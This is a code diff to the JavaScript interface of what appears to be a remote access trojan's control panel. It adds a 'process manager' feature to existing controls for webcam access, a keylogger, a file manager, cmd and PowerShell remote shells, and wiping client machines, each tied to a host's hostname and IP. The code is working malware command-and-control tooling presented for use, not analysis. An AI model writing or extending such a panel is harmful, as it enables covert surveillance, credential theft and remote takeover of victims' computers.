@@ -184,6 +184,7 @@ async function openHostDetail(c) {
 
       <div style="display:flex;gap:8px;margin-top:24px;flex-wrap:wrap">
         <button class="ghost mini" data-files>open files</button>
+        <button class="ghost mini" data-procs>processes</button>
         <button class="ghost mini" data-remote>go to remote</button>
         <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
       </div>
@@ -204,6 +205,9 @@ async function openHostDetail(c) {
   });
   box.querySelector('[data-files]').addEventListener('click', () => {
     openFileManager(c);
+  });
+  box.querySelector('[data-procs]').addEventListener('click', () => {
+    openProcs(c);
   });
   box.querySelector('[data-del]').addEventListener('click', async () => {
     if (!confirm(`delete ${c.hostname}?`)) return;
@@ -240,8 +244,6 @@ async function loadUploads(clientId, container) {
 }
 
 // ---------- FILE MANAGER ----------
-// sends shell="file" commands and polls the commands table for the result.
-// rejects on http error, bad response, missing commandId, or 2-minute timeout.
 async function runFileOp(clientId, action, path, extra = {}) {
   const payload = JSON.stringify({ action, path, ...extra });
   const r = await fetch(`/api/clients/${clientId}/exec`, {
@@ -344,7 +346,7 @@ async function renderFileList() {
       row.style.cssText = "display:flex; justify-content:space-between; align-items:center; padding:8px 12px; background:var(--bg); border:1px solid var(--line); border-radius:var(--r-sm); font-size:13px; cursor:pointer;";
       row.innerHTML = `
         <div style="display:flex; align-items:center; gap:10px; overflow:hidden; min-width:0;">
-          <svg class="icon" viewBox="0 0 24 24" style="width:14px;height:14px;flex-shrink:0; fill:none; stroke:${item.dir ? 'var(--accent)' : 'var(--muted)'}; stroke-width:2; stroke-linecap:round; stroke-linejoin:round;">
+          <svg class="icon" viewBox="0 0 24 24" style="width:14px;height:14px;flex-shrink:0; stroke:${item.dir ? 'var(--accent)' : 'var(--muted)'};">
             ${item.dir
               ? '<path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"/>'
               : '<path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/>'}
@@ -543,6 +545,7 @@ function openGearMenu(anchor, c) {
     <div class="item" data-item="webcam">webcam</div>
     <div class="item" data-item="keylog">keylogger</div>
     <div class="item" data-item="files">file manager</div>
+    <div class="item" data-item="procs">process manager</div>
     <div class="sep"></div>
     <div class="item" data-item="cmd">remote shell — cmd</div>
     <div class="item" data-item="ps">remote shell — powershell</div>
@@ -561,6 +564,7 @@ function openGearMenu(anchor, c) {
       else if (it === 'ps') openConsole(c, 'powershell');
       else if (it === 'wipe') wipeClient(c);
       else if (it === 'files') openFileManager(c);
+      else if (it === 'procs') openProcs(c);
     });
   });
   document.body.appendChild(menu);
@@ -608,6 +612,11 @@ function openWebcam(c) {
 function openKeylog(c) {
   const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
   window.open('/keylog.html?' + q.toString(), '_blank', 'width=1000,height=700');
+}
+
+function openProcs(c) {
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
+  window.open('/procs.html?' + q.toString(), '_blank', 'width=1100,height=800');
 }
 
 // ---------- toolbar wiring ----------
